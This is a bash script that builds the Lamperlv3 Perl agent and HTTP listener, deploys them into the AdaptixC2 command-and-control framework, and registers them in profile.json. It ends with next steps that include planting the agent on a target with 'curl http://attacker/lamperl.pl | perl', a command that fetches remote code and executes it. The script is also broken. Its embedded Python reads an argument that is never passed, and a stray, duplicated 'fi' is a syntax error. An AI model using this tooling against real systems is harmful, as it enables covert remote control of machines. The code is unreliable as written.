#!/bin/bash
# Build and deploy Lamperlv3 to Adaptix
# Usage: ./deploy_to_adaptix.sh /path/to/AdaptixC2

set -e

REPO_ROOT="$(cd "$(dirname "$0")" && pwd)"
ADAPTIX_ROOT="${1:-.}"

# Verify Adaptix root
if [ ! -d "$ADAPTIX_ROOT/dist/extenders" ]; then
    echo "[ERROR] Invalid Adaptix root: $ADAPTIX_ROOT"
    echo "Usage: $0 /path/to/AdaptixC2"
    exit 1
fi

echo "=========================================="
echo "Lamperlv3 Build & Deploy for Adaptix"
echo "=========================================="
echo ""
echo "[1] Building HTTP Listener..."
cd "$REPO_ROOT/Lamperlv3/lamperl_listener_http"
make clean
make
echo "[OK] Listener built"

echo ""
echo "[2] Building Agent..."
cd "$REPO_ROOT/Lamperlv3/lamperl_agent"
make clean
make
echo "[OK] Agent built"

echo ""
echo "[3] Deploying to Adaptix..."

# Create extender directories
mkdir -p "$ADAPTIX_ROOT/dist/extenders/lamperl_listener_http"
mkdir -p "$ADAPTIX_ROOT/dist/extenders/lamperl_agent"

# Copy listener
cp "$REPO_ROOT/Lamperlv3/lamperl_listener_http/dist/"* "$ADAPTIX_ROOT/dist/extenders/lamperl_listener_http/"
echo "[OK] Listener deployed"

# Copy agent
cp "$REPO_ROOT/Lamperlv3/lamperl_agent/dist/"* "$ADAPTIX_ROOT/dist/extenders/lamperl_agent/"
echo "[OK] Agent deployed"

echo ""
echo "[4] Registering extenders in profile.json..."

# Check if profile.json exists
if [ ! -f "$ADAPTIX_ROOT/profile.json" ]; then
    echo "[ERROR] profile.json not found at $ADAPTIX_ROOT/profile.json"
    echo "[INFO] Manual registration required - add to profile.json:"
    echo '  "extenders": ['
    echo '    "extenders/lamperl_listener_http/config.json",'
    echo '    "extenders/lamperl_agent/config.json"'
    echo '  ]'
else
    # Use Python to safely add extenders if not already present
    python3 <<'PYTHON_EOF'
import json
import sys
import os

profile_path = sys.argv[1]

with open(profile_path, 'r') as f:
    profile = json.load(f)

if 'extenders' not in profile:
    profile['extenders'] = []

# Add Lamperlv3 extenders if not already present
new_extenders = [
    "extenders/lamperl_listener_http/config.json",
    "extenders/lamperl_agent/config.json"
]

for ext in new_extenders:
    if ext not in profile['extenders']:
        profile['extenders'].append(ext)

with open(profile_path, 'w') as f:
    json.dump(profile, f, indent=2)

print(f"[OK] Extenders registered in {profile_path}")
PYTHON_EOF
fi "$ADAPTIX_ROOT/profile.json"
fi

echo ""
echo "=========================================="
echo "[SUCCESS] Lamperlv3 deployed successfully"
echo "=========================================="
echo ""
echo "Next steps:"
echo "1. Restart Adaptix C2 server"
echo "2. In Adaptix UI:"
echo "   - Create a new 'LamperlHTTP' listener"
echo "   - Configure bind address, port, callback address"
echo "   - Generate an agent"
echo "3. Deploy the agent (lamperl.pl) to target system:"
echo "   curl http://attacker/lamperl.pl | perl"
echo ""
echo "For detailed setup, see: $REPO_ROOT/ADAPTIX_SETUP.md"
